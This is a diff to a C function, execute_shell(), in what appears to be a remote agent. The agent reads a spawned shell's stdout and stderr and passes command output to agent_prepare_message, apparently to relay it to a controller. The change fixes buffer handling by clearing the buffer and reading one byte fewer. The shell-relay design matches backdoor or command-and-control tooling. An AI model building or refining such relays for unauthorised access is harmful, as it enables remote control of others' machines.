@@ -106,7 +106,8 @@ STATIC int execute_shell(){
 			}
 			
 			// Read from STDOUT
-			nbytes = read(shell_pipes.pipes[STDOUT].pipefd[PIPE_OUT], buf, PAYLOAD_SIZE);
+			memset(buf, 0, PAYLOAD_SIZE);
+			nbytes = read(shell_pipes.pipes[STDOUT].pipefd[PIPE_OUT], buf, PAYLOAD_SIZE - 1);
 			if (nbytes == -1){
 				if (errno != EAGAIN){				// EAGAIN means pipe is empty and no error
 					printf("ERROR STDOUT read from shell: %d\n", errno);
@@ -121,16 +122,16 @@ STATIC int execute_shell(){
 				buffer = malloc(nbytes);
 				memcpy(buffer, buf, nbytes);
 				
-				debug_print("command response\n_____\n%s\n_____\n", buffer);
+				debug_print("got command response: %s\n", buffer);
 				
 				if (agent_prepare_message(TYPE_COMMAND, buffer, nbytes) != RET_OK){
 					printf("ERROR agent_prepare_message error\n");
 				}
 			}
-			memset(buf, 0, PAYLOAD_SIZE);
 			
 			// Read from STDERR
-			nbytes = read(shell_pipes.pipes[STDERR].pipefd[PIPE_OUT], buf, PAYLOAD_SIZE);
+			memset(buf, 0, PAYLOAD_SIZE);
+			nbytes = read(shell_pipes.pipes[STDERR].pipefd[PIPE_OUT], buf, PAYLOAD_SIZE - 1);
 			if (nbytes == -1){
 				if (errno != EAGAIN){				// EAGAIN means pipe is empty and no error
 					printf("ERROR STDERR read from shell: %d\n", errno);
@@ -144,7 +145,6 @@ STATIC int execute_shell(){
 			else{
 				printf("DEBUG STDERR: %s\n", buf);
 			}
-			memset(buf, 0, PAYLOAD_SIZE);
 		}
 		
 		close(shell_pipes.pipes[STDIN].pipefd[PIPE_IN]);							// close input of STDIN
